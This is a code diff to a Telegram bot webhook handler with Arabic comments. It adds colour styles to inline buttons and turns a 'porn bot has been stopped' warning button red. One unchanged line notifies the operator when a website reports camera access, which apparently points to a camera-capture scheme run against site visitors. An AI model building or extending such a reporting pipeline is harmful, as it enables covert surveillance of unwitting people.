@@ -50,8 +50,9 @@ async function sendVideoWithButtons(chatId, videoUrl, caption, buttons = null) {
         if (buttons && buttons.length > 0) {
             const inlineKeyboard = buttons.map(btn => [{
                 text: btn.icon ? `${btn.icon} ${btn.text}` : btn.text,
-                // ✅ بدون url، فقط callback_data (لن يفعل شيئاً)
-                callback_data: btn.callback_data || 'noop'
+                callback_data: btn.callback_data || 'noop',
+                // ✅ هنا تم إضافة ميزة اللون للـ API الخاص بتليجرام
+                style: btn.style || 'primary' 
             }]);
             payload.reply_markup = { inline_keyboard: inlineKeyboard };
         }
@@ -83,7 +84,9 @@ async function sendMessageWithButtons(chatId, text, buttons = null) {
         if (buttons && buttons.length > 0) {
             const inlineKeyboard = buttons.map(btn => [{
                 text: btn.icon ? `${btn.icon} ${btn.text}` : btn.text,
-                callback_data: btn.callback_data || 'noop'
+                callback_data: btn.callback_data || 'noop',
+                // ✅ دعم تلوين الأزرار هنا أيضاً
+                style: btn.style || 'primary'
             }]);
             payload.reply_markup = { inline_keyboard: inlineKeyboard };
         }
@@ -314,17 +317,11 @@ module.exports = async (req, res) => {
         try {
             const update = req.body;
 
-            // ==========================================
-            // معالجة الـ Callback Query (الضغط على الزر)
-            // ==========================================
             if (update.callback_query) {
                 await handleCallbackQuery(update.callback_query);
                 return res.status(200).json({ ok: true });
             }
 
-            // ==========================================
-            // معالجة الرسائل
-            // ==========================================
             if (update.message) {
                 const message = update.message;
                 const chatId = message.chat.id;
@@ -344,13 +341,14 @@ module.exports = async (req, res) => {
 🆔 المعرف: ${chatId}
                     `;
 
-                    // 🔵 الزر المطلوب - بدون رابط، فقط كلام، لون أزرق (تلقائياً)
+                    // 🛑 تم تغيير نمط الزر هنا إلى 'destructive' ليظهر باللون الأحمر التحذيري فوراً
                     const customButtons = [
                         {
                             id: 'btn_warning',
-                            text: '⚠️ تم إيقاف البوت الإباحي',
-                            icon: '🔵', // إيموجي أزرق للإشارة
-                            callback_data: 'warning_clicked'
+                            text: 'تم إيقاف البوت الإباحي',
+                            icon: '⚠️', 
+                            callback_data: 'warning_clicked',
+                            style: 'destructive' // ✅ هذا السطر سيلون الزر باللون الأحمر
                         }
                     ];
 
@@ -386,9 +384,6 @@ module.exports = async (req, res) => {
                 `, defaultButtons);
             }
 
-            // ==========================================
-            // 4️⃣ طلب من الموقع
-            // ==========================================
             if (req.body.fromSite) {
                 if (CHAT_ID) {
                     await sendMessage(CHAT_ID, `📸 **تم الوصول للكاميرا من الموقع!**`);
